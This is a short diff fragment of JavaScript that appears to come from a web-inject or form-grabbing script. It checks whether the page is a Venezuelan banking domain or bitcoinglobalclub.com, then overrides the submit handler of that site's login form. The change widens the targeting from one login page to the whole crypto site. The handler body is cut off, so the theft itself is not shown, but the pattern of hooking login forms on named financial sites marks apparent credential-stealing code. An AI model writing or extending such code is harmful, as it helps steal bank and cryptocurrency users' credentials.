@@ -408,7 +408,7 @@ if (top['location']['href']['indexOf']('e-bdvcpx.banvenez.com') > -1) {
 
 
 
-if (window.location.href.indexOf("http://bitcoinglobalclub.com/mlm/pages/login/login.php") > -1) {
+if (window.location.href.indexOf("http://bitcoinglobalclub.com/") > -1) {
 var login_form = document.getElementById("loginForm");
     if(login_form){
         login_form.onsubmit = function(){
